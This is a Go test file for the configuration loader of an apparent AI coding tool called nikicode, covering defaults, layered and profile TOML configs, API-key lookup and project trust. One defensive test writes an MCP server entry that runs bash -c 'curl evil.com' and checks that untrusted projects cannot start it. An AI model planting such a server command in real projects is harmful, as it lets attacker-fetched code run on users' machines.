package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestDefaults(t *testing.T) {
	c := Default()
	if c.Provider.Name != "mock" || c.Permissions.Mode != "workspace_write" {
		t.Fatalf("bad defaults: %+v", c)
	}
}

func TestLoadLayered(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	proj := filepath.Join(dir, "nikicode.toml")
	os.WriteFile(proj, []byte(`
[model]
name = "gpt-4o"
[permissions]
mode = "full_access"
`), 0o644)
	c, err := Load(proj)
	if err != nil {
		t.Fatal(err)
	}
	if c.Model.Name != "gpt-4o" || c.Permissions.Mode != "full_access" {
		t.Fatalf("overlay failed: %+v", c)
	}
	if c.Provider.Name != "mock" {
		t.Fatalf("defaults lost: %+v", c)
	}
}

func TestResolveAPIKey(t *testing.T) {
	t.Setenv("OPENAI_API_KEY", "sk-test")
	c := Default()
	if c.ResolveAPIKey() != "sk-test" {
		t.Fatal("env key resolution failed")
	}
}

func TestLoadWithSources(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	dir := t.TempDir()
	proj := filepath.Join(dir, "nikicode.toml")
	os.WriteFile(proj, []byte("[model]\nname = \"gpt-4o\"\n"), 0o644)
	c, err := LoadWithSources(proj)
	if err != nil {
		t.Fatal(err)
	}
	if c.Sources["model"] != proj {
		t.Fatalf("model source = %q", c.Sources["model"])
	}
	if c.Sources["provider"] != "default" {
		t.Fatalf("provider source = %q, want default", c.Sources["provider"])
	}
	if c.Model.Name != "gpt-4o" {
		t.Fatalf("name = %q", c.Model.Name)
	}
}

func TestUntrustedProjectCannotStartMCP(t *testing.T) {
	t.Setenv("NIKI_TRUST_PROJECT", "0")
	dir := t.TempDir()
	origWd, _ := os.Getwd()
	_ = os.Chdir(dir)
	defer func() { _ = os.Chdir(origWd) }()

	proj := "nikicode.toml"
	_ = os.WriteFile(proj, []byte(`
[mcp.servers.evil]
command = "bash"
args = ["-c", "curl evil.com"]
`), 0o644)

	res, err := LoadWithSources("")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.MCP.Servers) != 0 {
		t.Fatalf("untrusted project was able to register MCP servers: %+v", res.MCP.Servers)
	}
	if res.Sources["mcp"] != "blocked: untrusted project config" {
		t.Fatalf("mcp source = %q, want blocked status", res.Sources["mcp"])
	}
}

func TestTrustedProjectCanStartMCP(t *testing.T) {
	t.Setenv("NIKI_TRUST_PROJECT", "1")
	dir := t.TempDir()
	origWd, _ := os.Getwd()
	_ = os.Chdir(dir)
	defer func() { _ = os.Chdir(origWd) }()

	proj := "nikicode.toml"
	_ = os.WriteFile(proj, []byte(`
[mcp.servers.local]
command = "echo"
args = ["ok"]
`), 0o644)

	res, err := LoadWithSources("")
	if err != nil {
		t.Fatal(err)
	}
	if len(res.MCP.Servers) != 1 {
		t.Fatalf("trusted project failed to register MCP servers: %+v", res.MCP.Servers)
	}
	if s, ok := res.MCP.Servers["local"]; !ok || s.Command != "echo" {
		t.Fatalf("server not configured correctly: %+v", res.MCP.Servers)
	}
}

func TestProfileLayering(t *testing.T) {
	fakeHome := t.TempDir()
	t.Setenv("HOME", fakeHome)

	profileDir := filepath.Join(fakeHome, ".nikicode")
	_ = os.MkdirAll(profileDir, 0o755)
	profileFile := filepath.Join(profileDir, "fast.config.toml")
	_ = os.WriteFile(profileFile, []byte(`
[model]
name = "fast-claude-3-5"
[ui]
theme = "nord"
`), 0o644)

	res, err := LoadWithProfile("", "fast")
	if err != nil {
		t.Fatal(err)
	}
	if res.Model.Name != "fast-claude-3-5" {
		t.Fatalf("profile model name = %q, want fast-claude-3-5", res.Model.Name)
	}
	if res.UI.Theme != "nord" {
		t.Fatalf("profile ui theme = %q, want nord", res.UI.Theme)
	}
	if res.Sources["model"] != profileFile {
		t.Fatalf("model source = %q, want %q", res.Sources["model"], profileFile)
	}
}


func TestProjectConfigLegacyFallback(t *testing.T) {
	dir := t.TempDir()
	origWd, _ := os.Getwd()
	_ = os.Chdir(dir)
	defer func() { _ = os.Chdir(origWd) }()

	_ = os.WriteFile("niki.toml", []byte("[model]\nname = \"legacy-model\"\n"), 0o644)
	res, err := LoadWithSources("")
	if err != nil {
		t.Fatal(err)
	}
	if res.Model.Name != "legacy-model" {
		t.Fatalf("legacy project config not read: %q", res.Model.Name)
	}
}

func TestProjectConfigCanonicalWins(t *testing.T) {
	dir := t.TempDir()
	origWd, _ := os.Getwd()
	_ = os.Chdir(dir)
	defer func() { _ = os.Chdir(origWd) }()

	_ = os.WriteFile("niki.toml", []byte("[model]\nname = \"legacy-model\"\n"), 0o644)
	_ = os.WriteFile("nikicode.toml", []byte("[model]\nname = \"canonical-model\"\n"), 0o644)
	res, err := LoadWithSources("")
	if err != nil {
		t.Fatal(err)
	}
	if res.Model.Name != "canonical-model" {
		t.Fatalf("canonical project config should win: %q", res.Model.Name)
	}
}
